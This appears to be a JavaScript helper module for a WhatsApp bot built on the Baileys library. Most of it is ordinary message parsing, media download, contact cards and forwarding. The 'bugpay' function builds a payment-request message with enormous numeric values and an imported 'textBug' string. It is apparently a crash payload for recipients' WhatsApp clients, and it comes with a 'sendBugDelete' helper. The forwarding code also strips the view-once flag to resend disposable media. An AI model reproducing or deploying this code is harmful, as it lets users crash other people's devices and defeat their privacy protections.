const {
	proto,
	getContentType,
	jidDecode,
	downloadContentFromMessage,
	generateWAMessageFromContent,
	generateForwardMessageContent,
} = require("@whiskeysockets/baileys");
const chalk = require("chalk");
const fs = require("fs");
const PhoneNumber = require("awesome-phonenumber");
const jimp = require("jimp");
const { textBug, kon } = require("./precisar");
const { font } = require("./font");

const downloadMedia = (message, pathFile) =>
	new Promise(async (resolve, reject) => {
		const type = Object.keys(message)[0];
		let mimeMap = {
			imageMessage: "image",
			videoMessage: "video",
			stickerMessage: "sticker",
			documentMessage: "document",
			audioMessage: "audio",
		};
		try {
			const stream = await downloadContentFromMessage(
				message[type],
				mimeMap[type]
			);
			let buffer = Buffer.from([]);
			for await (const chunk of stream) {
				buffer = Buffer.concat([buffer, chunk]);
			}
			if (pathFile) {
				await fs.promises.writeFile(pathFile, buffer);
				resolve(pathFile);
			} else {
				resolve(buffer);
			}
		} catch (e) {
			reject(e);
		}
	});
const decodeJid = (jid) => {
	if (/:\d+@/gi.test(jid)) {
		const decode = jidDecode(jid) || {};
		return (
			(decode.user && decode.server && decode.user + "@" + decode.server) ||
			jid
		).trim();
	} else {
		return jid.trim();
	}
};

exports.serialize = (m, conn) => {
	if (m.key) {
		m.id = m.key.id;
		m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
		m.chat = m.key.remoteJid;
		m.fromMe = m.key.fromMe;
		m.isGroup = m.chat.endsWith("@g.us");
		m.sender = decodeJid(
			(m.fromMe && conn.user.id) ||
				m.participant ||
				m.key.participant ||
				m.chat ||
				""
		);
	}
	if (m.message) {
		m.type = getContentType(m.message);
		if (m.type === "ephemeralMessage") {
			m.message = m.message[m.type].message;
			const tipe = Object.keys(m.message)[0];
			m.type = tipe;
			if (tipe === "viewOnceMessage") {
				m.message = m.message[m.type].message;
				m.type = getContentType(m.message);
			}
		}
		if (m.type === "viewOnceMessage") {
			m.message = m.message[m.type].message;
			m.type = getContentType(m.message);
		}

		m.mentions = m.message[m.type]?.contextInfo
			? m.message[m.type]?.contextInfo.mentionedJid
			: null;
		try {
			const quoted = m.message[m.type]?.contextInfo;
			if (quoted.quotedMessage["ephemeralMessage"]) {
				const tipe = Object.keys(
					quoted.quotedMessage.ephemeralMessage.message
				)[0];
				if (tipe === "viewOnceMessage") {
					m.quoted = {
						type: "view_once",
						stanzaId: quoted.stanzaId,
						participant: decodeJid(quoted.participant),
						sender: decodeJid(quoted.participant),
						message:
							quoted.quotedMessage.ephemeralMessage.message.viewOnceMessage
								.message,
					};
				} else {
					m.quoted = {
						type: "ephemeral",
						stanzaId: quoted.stanzaId,
						participant: decodeJid(quoted.participant),
						sender: decodeJid(quoted.participant),
						message: quoted.quotedMessage.ephemeralMessage.message,
					};
				}
			} else if (quoted.quotedMessage["viewOnceMessage"]) {
				m.quoted = {
					type: "view_once",
					stanzaId: quoted.stanzaId,
					participant: decodeJid(quoted.participant),
					sender: decodeJid(quoted.participant),
					message: quoted.quotedMessage.viewOnceMessage.message,
				};
			} else {
				m.quoted = {
					type: "normal",
					stanzaId: quoted.stanzaId,
					participant: decodeJid(quoted.participant),
					sender: decodeJid(quoted.participant),
					message: quoted.quotedMessage,
				};
			}
			m.quoted.fromMe = m.quoted.participant === decodeJid(conn.user.id);
			m.quoted.mtype = Object.keys(m.quoted.message).filter(
				(v) => v.includes("Message") || v.includes("conversation")
			)[0];
			m.quoted.text =
				m.quoted.message[m.quoted.mtype]?.text ||
				m.quoted.message[m.quoted.mtype]?.description ||
				m.quoted.message[m.quoted.mtype]?.caption ||
				m.quoted.message[m.quoted.mtype]?.hydratedTemplate
					?.hydratedContentText ||
				m.quoted.message[m.quoted.mtype] ||
				"";
			m.quoted.key = {
				id: m.quoted.stanzaId,
				fromMe: m.quoted.fromMe,
				remoteJid: m.chat,
			};
			m.quoted.delete = () =>
				conn.sendMessage(m.chat, { delete: m.quoted.key });
			m.quoted.download = (pathFile) =>
				downloadMedia(m.quoted.message, pathFile);
			m.quoted.react = (text) =>
				conn.sendMessage(m.chat, { react: { text, key: m.quoted.key } });
		} catch {
			m.quoted = null;
		}
		m.body =
			m.message?.conversation ||
			m.message?.[m.type]?.text ||
			m.message?.[m.type]?.caption ||
			(m.type === "listResponseMessage" &&
				m.message?.[m.type]?.singleSelectReply?.selectedRowId) ||
			(m.type === "buttonsResponseMessage" &&
				m.message?.[m.type]?.selectedButtonId) ||
			(m.type === "templateButtonReplyMessage" &&
				m.message?.[m.type]?.selectedId) ||
			"";
		m.text = m.body;
		m.name = m?.pushName;
		m.reply = (text) =>
			conn.sendMessage(m.chat, { text: font(text, "a") }, { quoted: m });
		m.download = (pathFile) => downloadMedia(m.message, pathFile);
		m.react = (text) =>
			conn.sendMessage(m.chat, { react: { text, key: m.key } });
	}
	return m;
};
exports.initialize = async (conn, store) => {
	conn.getName = (jid, withoutContact = false) => {
		var id = conn.decodeJid(jid);
		withoutContact = conn.withoutContact || withoutContact;
		let v;
		if (id.endsWith("@g.us"))
			return new Promise(async (resolve) => {
				v = store.contacts[id] || {};
				if (!(v.name || v.subject)) v = conn.groupMetadata(id) || {};
				resolve(
					v.name ||
						v.subject ||
						PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber(
							"international"
						)
				);
			});
		else
			v =
				id === "0@s.whatsapp.net"
					? {
							id,
							name: "WhatsApp",
					  }
					: id === conn.decodeJid(conn.user.id)
					? conn.user
					: store.contacts[id] || {};
		return (
			(withoutContact ? "" : v.name) ||
			v.subject ||
			v.verifiedName ||
			PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber(
				"international"
			)
		);
	};

	conn.sendContact = async (jid, kon, quoted = "", opts = {}) => {
		const contacts = [];
		for (let number of kon) {
			number = number.replace(/[^0-9]/g, "");
			const njid = number + "@s.whatsapp.net";
			const biz = (await conn.getBusinessProfile(njid).catch((_) => null)) || {};
			const name = await conn.getName(njid)
			const vcard = `
BEGIN:VCARD
VERSION:3.0
N:;${name.replace(/\n/g, "\\n")};;;
FN:${name.replace(/\n/g, "\\n")}
TEL;type=CELL;type=VOICE;waid=${number}:${PhoneNumber("+" + number).getNumber(
				"international"
			)}${
				biz.description
					? `
X-WA-BIZ-NAME:${await conn.getName(njid).replace(/\n/, "\\n")}
X-WA-BIZ-DESCRIPTION:${biz.description.replace(/\n/g, "\\n")}
`.trim()
					: ""
			}
END:VCARD
`.trim();
			contacts.push({ vcard, displayName: name });
		}
		return await conn.sendMessage(
			jid,
			{
				contacts: {
					displayName: `${contacts.length} Contacts`,
					contacts: contacts,
				},
				...opts,
			},
			{ quoted }
		);
	};

	conn.copyNForward = async (
		jid,
		message,
		forceForward = false,
		options = {}
	) => {
		let vtype;
		if (options.readViewOnce) {
			message.message =
				message.message &&
				message.message.ephemeralMessage &&
				message.message.ephemeralMessage.message
					? message.message.ephemeralMessage.message
					: message.message || undefined;
			vtype = Object.keys(message.message.viewOnceMessage.message)[0];
			delete (message.message && message.message.ignore
				? message.message.ignore
				: message.message || undefined);
			delete message.message.viewOnceMessage.message[vtype].viewOnce;
			message.message = {
				...message.message.viewOnceMessage.message,
			};
		}

		let mtype = Object.keys(message.message)[0];
		let content = await generateForwardMessageContent(message, forceForward);
		let ctype = Object.keys(content)[0];
		let context = {};
		if (mtype != "conversation") context = message.message[mtype].contextInfo;
		content[ctype].contextInfo = {
			...context,
			...content[ctype].contextInfo,
		};
		const waMessage = await generateWAMessageFromContent(
			jid,
			content,
			options
				? {
						...content[ctype],
						...options,
						...(options.contextInfo
							? {
									contextInfo: {
										...content[ctype].contextInfo,
										...options.contextInfo,
									},
							  }
							: {}),
				  }
				: {}
		);
		await conn.relayMessage(jid, waMessage.message, {
			messageId: waMessage.key.id,
		});
		return waMessage;
	};

	conn.fpay = () => {
		xtol = {
			key: {
				remoteJid: "0@s.whatsapp.net",
				fromMe: false,
				id: "🔥፝⃟ ꙳MIAW🔥፝⃟ ",
				participant: "0@s.whatsapp.net",
			},
			message: {
				requestPaymentMessage: {
					currencyCodeIso4217: "IDR",
					amount1000: 9999999,
					requestFrom:
						conn !== null && conn !== undefined
							? conn.sender
							: "628999699559@s.whatsapp.net",
					noteMessage: {
						extendedTextMessage: {
							text: conn !== null && conn !== undefined ? conn.text : "Miaw - Bot",
						},
					},
					expiryTimestamp: 999999,
					amount: {
						value: 91929291929,
						offset: 5000,
						currencyCode: "IDR",
					},
				},
			},
		};
		return xtol;
	};

conn.bugpay = () => {
		xtol = {
			key: {
				remoteJid: "0@s.whatsapp.net",
				fromMe: false,
				id: "🔥፝⃟ ꙳BLAZE🔥፝⃟ ",
				participant: "0@s.whatsapp.net",
			},
			message: {
				requestPaymentMessage: {
					currencyCodeIso4217: "USD",
					amount1000: 9988888888999999999899999999999999999999999999999999,
					requestFrom:
						conn !== null && conn !== undefined ? conn.sender : "0@s.whatsapp.net",
					noteMessage: {
						extendedTextMessage: {
							text: textBug,
						},
					},
					expiryTimestamp: 999999999999999999999999999999999999999,
					amount: {
						value: 9192929999999999999999999999999999999999991929,
						offset: 99999999999999999999999999999999999999999999999999999,
						currencyCode: "USD",
					},
				},
			},
		};
		return xtol;
	};

conn.sendBugDelete = async (idMsg, toDel) => {
		conn.sendMessage(
			m.chat,
			{
				delete: {
					remoteJid: m.chat,
					fromMe: false,
					id: idMsg,
					participant: kon(m.chat),
				},
			},
			{
				quoted: kon(m.chat),
			}
		);
	};

	conn.decodeJid = (jid) => {
		if (!jid) return jid;
		if (/:\d+@/gi.test(jid)) {
			let decode = jidDecode(jid) || {};
			return (
				(decode.user && decode.server && decode.user + "@" + decode.server) ||
				jid
			);
		} else return jid;
	};
	conn.sendListMsg = (
		jid,
		text = "",
		footer = "",
		title = "",
		butText = "",
		sects = [],
		quoted
	) => {
		let sections = sects;
		var listMes = {
			text: text,
			footer: footer,
			title: title,
			buttonText: butText,
			sections,
		};
		conn.sendMessage(jid, listMes, { quoted: msg });
	};
	conn.generateProfilePicture = async (buffer) => {
		const jimp_1 = await jimp.read(buffer);
		const resz =
			jimp_1.getWidth() > jimp_1.getHeight()
				? jimp_1.resize(550, jimp.AUTO)
				: jimp_1.resize(jimp.AUTO, 650);
		const jimp_2 = await jimp.read(await resz.getBufferAsync(jimp.MIME_JPEG));
		const _buffer = await resz.getBufferAsync(jimp.MIME_JPEG);
		return _buffer;
	};
	return conn;
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
	fs.unwatchFile(file);
	console.log(chalk.green("[UPDATED]", chalk.white(__filename)));
	delete require.cache[file];
	require(file);
});
